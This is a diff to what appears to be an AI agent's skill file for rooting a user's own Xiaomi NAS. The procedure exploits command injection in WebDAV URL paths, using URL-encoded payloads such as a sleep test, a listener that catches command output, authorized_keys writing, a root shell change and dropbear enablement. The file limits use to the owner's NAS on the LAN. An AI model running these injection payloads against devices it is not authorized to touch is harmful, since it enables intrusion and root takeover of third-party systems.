@@ -1,6 +1,6 @@
 # Xiaomi NAS SSH/root enablement via certified WebDAV injection
 
-Use this skill when the user asks to open/enable SSH/root on their local Xiaomi NAS/RP05, reproduce the “小米 NAS 稳定 SSH” image workflow, or continue the local Xiaomi NAS rooting process.
+Use this skill when the user asks to open/enable SSH/root on their local Xiaomi NAS/RP05, or continue the local Xiaomi NAS SSH enablement process. Prefer the integrated scripts in this repo.
 
 Safety/authorization:
 - Only run against the user's own NAS on their LAN.
@@ -21,17 +21,7 @@ Runtime/owner-specific context:
 - Store WebDAV credentials as `username:password` in `/tmp/.wdav_creds` with mode 600. Never print the password in chat.
 - User may need to log into the Xiaomi NAS app using account/password before monitoring; treat app-derived tokens/WebDAV credentials as sensitive secrets.
 - Previous issue notes: `~/issuebase/mi-nas/`
-- Tutorial screenshots: `~/Desktop/nasroot/`
-- Screenshot order available in this session:
-  1. `IMG_0547.PNG` prepare variables/certs
-  2. `IMG_0548.PNG` cert vars + WebDAV credentials
-  3. `IMG_0549.PNG` WebDAV upload + listener
-  4. `F1FBFB53-0685-402D-B605-CA43802D1086_1_105_c.jpeg` injection channel test
-  5. `0CB7F9E4-332D-41AA-B7BD-89045C888488_1_105_c.jpeg` generate key + upload pubkey
-  6. `D0933AAB-E577-4FE3-B801-FF7837B88710_1_105_c.jpeg` write authorized_keys
-  7. `4114378D-A9AC-4470-AD7F-B5998EA783E7_1_105_c.jpeg` change root shell to /bin/sh
-  8. `IMG_0554.PNG` enable dropbear + verify SSH
-- Missing screenshot: 9/9, likely cleanup/persistence notes. Warn user when absent.
+- Ready-made runners live in this repo under `scripts/`.
 
 Required inputs:
 - `NAS_IP`: NAS LAN IP. Keep exact value local/redacted in chat.
@@ -66,7 +56,7 @@ CA_CERT="$CERT_DIR/ca_chain.pem"
 Derive/verify CN if possible:
 ```sh
 openssl x509 -in "$CLIENT_CERT" -noout -subject -issuer -dates
-# If screenshot workflow gives CN separately, use that exact DNS name.
+# If the owner already knows the CN, use that exact DNS name.
 ```
 
 Set curl cert args:
@@ -124,19 +114,19 @@ echo $! > /tmp/nas_listen.pid
 sleep 1
 ```
 
-Injection primitives from screenshots:
+Injection primitives:
 - The WebDAV URL path begins under `/pool0/video/` and ends `__.ts`.
 - Shell commands are injected by URL-encoded `bash -c` style payloads.
-- Paths containing `/` must not appear raw in the command payload; construct them with encoded `printf` sequences as shown in screenshots.
+- Paths containing `/` must not appear raw in the command payload; construct them with encoded `printf` sequences.
 - After each injection, check `/tmp/nas_listen_out.txt`.
 
-Low-risk tests from screenshots:
+Low-risk tests:
 ```sh
 # 3-second delay test; expected curl elapsed around 3 seconds.
 P="/pool0/video/__x%22%3Bsleep%203%3B%22__.ts"
 time curl -s -o /dev/null --max-time 15 -g -u "$CREDS" $CERT_ARGS_WD "https://$CN:5000$P"
 
-# docker ps output回传, based on screenshot. Use exact encoded form or reconstruct carefully.
+# docker ps output回传: use the exact encoded form from the integrated runner.
 # Expected: listener output includes docker ps table.
 ```
 
@@ -176,7 +166,7 @@ SH
 
 Enable dropbear:
 ```sh
-# Screenshot command payload executes:
+# Command payload executes:
 # systemctl enable dropbear.socket && systemctl start dropbear.socket && mitee_tool rpmb set ssh_en true
 # It is wrapped in systemd-run --unit=enable_ssh /bin/sh -c '...'
 # Use max-time because systemd-run should return quickly.
@@ -191,9 +181,9 @@ ssh -i /tmp/nas-root-key -o StrictHostKeyChecking=accept-new root@"$NAS_IP" id
 
 Integrated step-by-step runner:
 ```sh
-# Existing local script; prints [step] + OK/WARN/FAIL after each stage.
-NAS_IP='<NAS_IP>' ~/issuebase/mi-nas/scripts/enable-xiaomi-nas-ssh.sh
-# or: ~/issuebase/mi-nas/scripts/enable-xiaomi-nas-ssh.sh '<NAS_IP>'
+# Prefer the repo script; prints [step] + OK/WARN/FAIL after each stage.
+NAS_IP='<NAS_IP>' ./scripts/enable-xiaomi-nas-ssh.sh
+# or: ./scripts/enable-xiaomi-nas-ssh.sh '<NAS_IP>'
 ```
 Notes for the runner:
 - It must receive the current owner's NAS IP at runtime.
@@ -215,10 +205,10 @@ Notes for the runner:
 
 Monitoring/recovery procedure used to discover app runtime paths and credentials:
 ```sh
-# Script created in this workspace:
-~/issuebase/mi-nas/scripts/watch-xiaomi-nas-app.sh
+# Prefer the repo script:
+./scripts/watch-xiaomi-nas-app.sh
 ```
-If the script is missing, recreate a compact version from this embedded template. Keep exact IP local; pass it through `NAS_IP=...` and do not print it in chat:
+If that script is missing from the checkout, recreate a compact version from this embedded template under `~/issuebase/mi-nas/scripts/`. Keep exact IP local; pass it through `NAS_IP=...` and do not print it in chat:
 ```sh
 mkdir -p "$HOME/issuebase/mi-nas/scripts"
 cat > "$HOME/issuebase/mi-nas/scripts/watch-xiaomi-nas-app.sh" <<'SH'
